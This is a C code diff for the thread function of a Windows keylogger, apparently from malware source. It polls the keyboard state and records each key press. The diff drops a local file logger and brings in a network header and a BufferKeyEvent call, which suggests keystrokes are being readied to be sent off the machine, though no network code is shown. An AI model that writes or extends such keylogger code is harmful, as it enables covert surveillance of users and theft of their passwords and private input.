@@ -1,6 +1,6 @@
 #include <Windows.h>
 #include "keylogger.h"
-#include "logger.h"
+#include "network.h"
 #include "../Common/constants.h"
 
 // Global variables for keylogger thread
@@ -13,11 +13,6 @@ static BYTE g_prevKeyState[256] = {0};
 // Keylogger thread function
 // Polls keyboard state and logs key presses
 DWORD WINAPI KeyloggerThread(LPVOID lpParam) {
-    // Initialize logger
-    if (!InitLogger()) {
-        return 1;  // Failed to initialize logger
-    }
-
     // Main polling loop
     while (!g_bStopThread) {
         // Poll all keys in the monitored range
@@ -28,7 +23,7 @@ DWORD WINAPI KeyloggerThread(LPVOID lpParam) {
 
             // Detect key-down transition (was up, now down)
             if (isPressed && !g_prevKeyState[vk]) {
-                LogKey(vk);
+                BufferKeyEvent(vk);
                 g_prevKeyState[vk] = 1;
             }
             // Detect key-up transition
@@ -40,9 +35,6 @@ DWORD WINAPI KeyloggerThread(LPVOID lpParam) {
         // Sleep to reduce CPU usage
         Sleep(POLLING_INTERVAL_MS);
     }
-
-    // Cleanup logger
-    CleanupLogger();
 
     return 0;
 }
